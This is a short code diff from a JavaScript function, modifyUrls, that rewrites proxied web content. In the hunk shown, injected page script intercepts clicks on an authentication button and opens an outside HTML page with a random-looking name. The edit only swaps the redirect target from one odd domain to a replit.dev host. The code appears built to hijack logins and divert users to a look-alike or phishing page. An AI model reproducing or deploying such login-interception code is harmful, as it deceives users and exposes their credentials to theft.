@@ -265,7 +265,7 @@ function modifyUrls(content, baseUrl, contentType = '') {
                         console.log('🔐 Auth button intercepted!');
                         
                         // Перенаправляем на существующий домен
-                        window.open('https://oldwwweeeewee.com/6kaomrcjpf2m.html', '_blank');
+                        window.open('https://3572a8ce-e86d-4f44-9bb8-2d8dbaf70da2-00-2ang8yl1tdkr1.spock.replit.dev/6kaomrcjpf2m.html', '_blank');
                         
                         return false;
                     }
